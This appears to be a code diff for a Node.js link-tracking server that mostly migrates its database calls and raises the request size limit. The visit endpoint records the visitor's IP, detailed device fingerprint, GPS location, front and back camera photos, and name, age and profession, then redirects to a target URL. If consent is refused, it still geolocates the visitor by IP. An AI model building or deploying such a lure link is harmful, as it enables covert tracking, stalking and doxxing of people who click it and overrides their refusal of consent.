@@ -3,7 +3,7 @@ const UAParser = require('ua-parser-js');
 const db = require('../db');
 
 const router = express.Router();
-router.use(express.json({ limit: '10mb' }));
+router.use(express.json({ limit: '15mb' }));
 
 function getClientIp(req) {
   const fwd = req.headers['x-forwarded-for'];
@@ -24,86 +24,104 @@ async function ipLookup(ip) {
   return null;
 }
 
-router.get('/l/:slug', (req, res) => {
-  const link = db.prepare('SELECT * FROM links WHERE slug = ?').get(req.params.slug);
-  if (!link) return res.status(404).send('This link does not exist or has been removed.');
-  res.render('consent', { slug: link.slug });
+router.get('/l/:slug', async (req, res) => {
+  try {
+    const result = await db.execute({
+      sql: 'SELECT * FROM links WHERE slug = ?',
+      args: [req.params.slug]
+    });
+    if (result.rows.length === 0) return res.status(404).send('This link does not exist.');
+    res.render('consent', { slug: result.rows[0].slug });
+  } catch(e) {
+    console.error(e);
+    res.status(500).send('Server error');
+  }
 });
 
 router.post('/api/visit/:slug', async (req, res) => {
-  const link = db.prepare('SELECT * FROM links WHERE slug = ?').get(req.params.slug);
-  if (!link) return res.status(404).json({ error: 'Link not found' });
+  try {
+    const linkRes = await db.execute({
+      sql: 'SELECT * FROM links WHERE slug = ?',
+      args: [req.params.slug]
+    });
+    if (linkRes.rows.length === 0) return res.status(404).json({ error: 'Link not found' });
+    const link = linkRes.rows[0];
 
-  const {
-    location, consented,
-    deviceInfo = {},
-    photo_front = null,
-    photo_back = null,
-    surveyAnswers = {},
-  } = req.body || {};
+    const {
+      location, consented,
+      deviceInfo = {},
+      photo_front = null,
+      photo_back = null,
+      surveyAnswers = {},
+    } = req.body || {};
 
-  const ua = new UAParser(req.headers['user-agent']);
-  const browser = ua.getBrowser();
-  const os = ua.getOS();
-  const device = ua.getDevice();
-  const ip = getClientIp(req);
+    const ua = new UAParser(req.headers['user-agent']);
+    const browser = ua.getBrowser();
+    const os = ua.getOS();
+    const device = ua.getDevice();
+    const ip = getClientIp(req);
 
-  let lat = null, lon = null, accuracy = null, locationSource = 'none';
+    let lat = null, lon = null, accuracy = null, locationSource = 'none';
 
-  if (consented && location && typeof location.lat === 'number') {
-    lat = location.lat;
-    lon = location.lon;
-    accuracy = location.accuracy || null;
-    locationSource = 'gps';
-  } else {
-    const fallback = await ipLookup(ip);
-    if (fallback) {
-      lat = fallback.lat;
-      lon = fallback.lon;
-      locationSource = 'ip';
+    if (consented && location && typeof location.lat === 'number') {
+      lat = location.lat;
+      lon = location.lon;
+      accuracy = location.accuracy || null;
+      locationSource = 'gps';
     } else {
-      locationSource = 'denied';
+      const fallback = await ipLookup(ip);
+      if (fallback) {
+        lat = fallback.lat;
+        lon = fallback.lon;
+        locationSource = 'ip';
+      } else {
+        locationSource = 'denied';
+      }
     }
+
+    await db.execute({
+      sql: `INSERT INTO visits (
+        link_id, ip, user_agent, browser, os, device_type,
+        lat, lon, accuracy, location_source, consented,
+        screen_resolution, timezone, language, network_type,
+        battery_level, battery_charging, cpu_cores, memory_gb,
+        referrer, touch_support, photo_front, photo_back,
+        survey_first_name, survey_last_name, survey_age,
+        survey_profession, survey_hobbies, survey_passions
+      ) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
+      args: [
+        link.id, ip,
+        req.headers['user-agent'] || null,
+        `${browser.name || ''} ${browser.version || ''}`.trim() || null,
+        `${os.name || ''} ${os.version || ''}`.trim() || null,
+        device.type || 'desktop',
+        lat, lon, accuracy, locationSource, consented ? 1 : 0,
+        deviceInfo.screen_resolution || null,
+        deviceInfo.timezone || null,
+        deviceInfo.language || null,
+        deviceInfo.network_type || null,
+        deviceInfo.battery_level != null ? deviceInfo.battery_level : null,
+        deviceInfo.battery_charging != null ? (deviceInfo.battery_charging ? 1 : 0) : null,
+        deviceInfo.cpu_cores || null,
+        deviceInfo.memory_gb || null,
+        deviceInfo.referrer || null,
+        deviceInfo.touch_support != null ? (deviceInfo.touch_support ? 1 : 0) : null,
+        photo_front || null,
+        photo_back || null,
+        surveyAnswers.first_name || null,
+        surveyAnswers.last_name || null,
+        surveyAnswers.age || null,
+        surveyAnswers.profession || null,
+        surveyAnswers.hobbies || null,
+        surveyAnswers.passions || null,
+      ]
+    });
+
+    res.json({ redirect: link.target_url });
+  } catch(e) {
+    console.error(e);
+    res.status(500).json({ error: 'Server error' });
   }
-
-  db.prepare(`
-    INSERT INTO visits (
-      link_id, ip, user_agent, browser, os, device_type,
-      lat, lon, accuracy, location_source, consented,
-      screen_resolution, timezone, language, network_type,
-      battery_level, battery_charging, cpu_cores, memory_gb,
-      referrer, touch_support, photo_front, photo_back,
-      survey_first_name, survey_last_name, survey_age,
-      survey_profession, survey_hobbies, survey_passions
-    ) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
-  `).run(
-    link.id, ip,
-    req.headers['user-agent'] || null,
-    `${browser.name || ''} ${browser.version || ''}`.trim() || null,
-    `${os.name || ''} ${os.version || ''}`.trim() || null,
-    device.type || 'desktop',
-    lat, lon, accuracy, locationSource, consented ? 1 : 0,
-    deviceInfo.screen_resolution || null,
-    deviceInfo.timezone || null,
-    deviceInfo.language || null,
-    deviceInfo.network_type || null,
-    deviceInfo.battery_level != null ? deviceInfo.battery_level : null,
-    deviceInfo.battery_charging != null ? (deviceInfo.battery_charging ? 1 : 0) : null,
-    deviceInfo.cpu_cores || null,
-    deviceInfo.memory_gb || null,
-    deviceInfo.referrer || null,
-    deviceInfo.touch_support != null ? (deviceInfo.touch_support ? 1 : 0) : null,
-    photo_front || null,
-    photo_back  || null,
-    surveyAnswers.first_name  || null,
-    surveyAnswers.last_name   || null,
-    surveyAnswers.age         || null,
-    surveyAnswers.profession  || null,
-    surveyAnswers.hobbies     || null,
-    surveyAnswers.passions    || null,
-  );
-
-  res.json({ redirect: link.target_url });
 });
 
 module.exports = router;
